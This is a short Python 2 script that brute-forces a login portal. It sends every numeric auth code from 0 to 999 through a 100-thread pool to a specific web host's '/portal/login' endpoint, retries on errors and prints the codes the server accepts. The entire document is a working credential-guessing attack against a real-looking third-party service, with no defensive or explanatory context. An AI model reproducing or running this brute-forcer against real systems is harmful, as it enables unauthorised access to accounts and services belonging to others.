import urllib2
import urllib
import json
import threadpool

results = []


def _workerThread(authCode, retry):
    try:
        print "dispatching %d -- retrying %d" % (authCode, retry)
        values = {'authCode': authCode, 'authType': 0} # WFT is authType?
        data = urllib.urlencode(values)
        r = urllib2.urlopen("http://jwf.cc:8081/portal/login", data)
        result_json = json.loads(r.read())
        if result_json["result"] == "true":
            print "got result %d" % (authCode,)
            results.append(authCode)
    except Exception as ex:
        if retry == 3:
            print "Maxium retry number reached, exit"
            print ex
            return
        _workerThread(authCode, retry + 1)


def workerThread(authCode):
    _workerThread(authCode, 0)


pool = threadpool.ThreadPool(100)
requests = threadpool.makeRequests(workerThread, range(1000))
[pool.putRequest(req) for req in requests]
pool.wait()
print "result summary (authCodes): %s" % results
